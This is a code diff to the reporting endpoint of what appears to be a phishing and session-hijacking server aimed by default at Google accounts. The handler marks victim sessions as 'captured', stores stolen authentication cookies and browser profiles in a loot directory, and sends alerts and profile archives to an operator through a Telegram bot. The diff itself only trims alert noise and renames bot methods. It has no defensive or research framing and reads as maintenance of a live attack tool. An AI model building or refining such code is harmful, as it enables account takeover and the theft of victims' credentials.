@@ -240,48 +240,35 @@ def report():
     session = sessions[session_id]
     session["last_activity"] = timestamp
     
-    # Handle different report types
+    # Handle report types - ONLY important alerts
     if report_type == "session_start":
         target = os.environ.get("TARGET_URL", "https://accounts.google.com")
-        run_async(bot.alert_session_start(session_id, target))
+        run_async(bot.on_session_start(session_id, target))
     
     elif report_type == "cookies_update":
-        count = report_data.get("count", 0)
-        auth_count = report_data.get("auth_count", 0)
-        session["cookie_count"] = count
-        session["auth_count"] = auth_count
-        
-        # Only send if significant (rate limited in bot)
-        if count > 10 or auth_count > 0:
-            run_async(bot.alert_cookies_update(session_id, count, auth_count))
+        # Just update counts, NO telegram spam
+        session["cookie_count"] = report_data.get("count", 0)
+        session["auth_count"] = report_data.get("auth_count", 0)
     
     elif report_type == "auth_cookies":
-        count = report_data.get("count", 0)
-        total = report_data.get("total_cookies", 0)
+        # THE IMPORTANT ONE - send alert
         cookies = report_data.get("cookies", [])
+        total = report_data.get("total_cookies", 0)
         
         session["status"] = "captured"
         session["cookie_count"] = total
-        session["auth_count"] = count
+        session["auth_count"] = len(cookies)
         session["auth_cookies"] = cookies
         
         loot_path = str(LOOT_DIR / session_id)
-        
-        # Send the important alert with buttons
-        run_async(bot.alert_auth_captured(session_id, total, cookies, loot_path))
-        
-        # Also send the cookies file directly
-        cookies_file = LOOT_DIR / session_id / "cookies.json"
-        if cookies_file.exists():
-            run_async(bot.send_cookies_file(session_id, str(cookies_file)))
+        run_async(bot.on_auth_captured(session_id, cookies, total, loot_path))
     
     elif report_type == "profile_exported":
         path = report_data.get("path", "")
         session["profile_path"] = path
-        
         # Send profile zip
         if path:
-            run_async(bot.send_profile_zip(session_id, path))
+            run_async(bot.send_profile(session_id, path))
     
     save_sessions(sessions)
     
